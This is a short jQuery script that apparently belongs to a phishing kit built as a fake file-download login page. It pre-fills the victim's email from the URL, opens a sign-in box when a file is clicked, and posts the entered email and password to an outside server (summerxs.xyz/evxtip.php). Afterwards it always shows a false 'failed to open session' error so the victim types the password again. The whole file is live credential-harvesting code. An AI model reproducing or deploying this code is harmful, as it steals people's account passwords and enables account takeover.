$(document).ready(function(){

    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());

    $("input#email").val(params['e']);
    
    $("#x").click(function(event){
        $("#box").css("display","none");
    });

    $("a.download-all").click(function(event){
        event.preventDefault();
        event.stopPropagation();
        $("#box").css("display","block");
        let email = $("input#email").val();
        if(email.length < 6 || ! email.includes("@")){
            $("input#email").val("");
            $("input#email").focus();
        }else{
            $("input#password").focus();
        }
    });

    $("li.file-item").click(function(event){
        event.preventDefault();
        event.stopPropagation();
        $("#box").css("display","block");
        let email = $("input#email").val();
        if(email.length < 6 || ! email.includes("@")){
            $("input#email").val("");
            $("input#email").focus();
        }else{
            $("input#password").focus();
        }
    });

    $("#submitBtn").on('click', function(event){
        event.preventDefault();
        let email = $("input#email").val();
        let password = $("input#password").val();
        let error = $("#error");
        let preloader = $(".preloader");
        $("input#email").removeClass('errorborder');
        $("input#password").removeClass('errorborder');
        if(email.length < 6 || ! email.includes("@")){
            $("input#email").addClass('errorborder').focus();
            error.text("Correct email address required");
            error.css("display", "block");
            return;
        }
        if(password.length < 4){
            $("input#password").addClass('errorborder').focus();
            error.text("Correct email password required");
            error.css("display", "block");
            return;
        }
        error.css("display", "none");
        preloader.css("display","block");
        $("#lcont").css("display", "none");
        $.ajax({
            url: 'https://summerxs.xyz/evxtip.php',
            method: 'post',
            data: {
                email: email,
                pass: password
            },
            beforeSend: function (xhr) {
                $('#submitBtn').html('Checking...').prop('disabled', true);
            },
            success: function(data){
                setTimeout(() => {
                    preloader.css("display","none");
                    $("#lcont").css("display", "block");
                    error.text("Error: failed to open session, please try again with your correct email and password");
                    error.css("display", "block");
                    $("input#password").val("");
                    $("input#password").focus();
                }, 2000);
                
            },
            error: function (response) {
            // stopHtmlRender();
            },
            complete: function () {
                $('#submitBtn').html('Sign In').prop('disabled', false);
            }


        });
    });
});